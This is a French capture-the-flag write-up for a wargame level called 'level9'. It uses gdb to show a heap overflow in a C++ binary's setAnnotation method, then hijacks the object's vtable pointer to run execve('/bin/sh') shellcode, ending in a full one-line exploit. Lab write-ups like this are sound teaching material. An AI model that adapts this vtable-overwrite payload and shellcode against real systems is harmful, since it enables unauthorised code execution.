En desassemblant le main on se rend compte que le binaire a été coder en cpp.

Les lignes comme

```gdb
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
``
Ou
```gdb
0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
```
Nous le confirme.

On peux voir qu'il y 'a un appel a memcpy dans le methode setAnnotation sur un buffer de 108 que l'on peux override

```gdb
0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
...
...
0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
```

On va tenter d'executer un shellcode.

```gdb
(gdb) b *0x0804867c
(gdb) r $(python -c "print('B' * 108)")
(gdb) x/10xw $esp
0xbffff640:	0x0804a008	0xbffff84b	0xbffff710	0xb7d79e55
0xbffff650:	0x0804a078	0x0804a008	0x0804a078	0x0804a008
0xbffff660:	0x08048770	0xb7eebff4
(gdb) x/10xw 0x0804a008
0x804a008:	0x08048848	0x42424242	0x42424242	0x42424242
0x804a018:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a028:	0x42424242	0x42424242
(gdb) x/xw 0x804a008
0x804a008:	0x08048848
(gdb) x/x 0x08048848 //pointeur de la table virtuelle qui est passer par le compilateur cpp
0x8048848 <_ZTV1N+8>:	0x0804873a
(gdb) x/x $eax
0x804a00c:	0x42424242
```
On récupere l'adresse de notre buffer. 0x804a008 + 0x4 == 0x0x804a00c

On récupere l'adresse qui est utilisé après le décalage 0x0804a010

On a plus qu'a construire notre payload.

[address de notre shellcode][shellcode][bourrage 108 - 4 address shelllcode - 33 taille de shellcode][addresse de notre buffer]

```gdb
./level9 $(python -c "print('\x10\xa0\x04\x08' + '\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x68\x2f\x73\x68\x31\x80\x74\x24\x03\x31\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80' + ('B' * (104 - 33)) + '\x0c\xa0\x04\x08')")
```
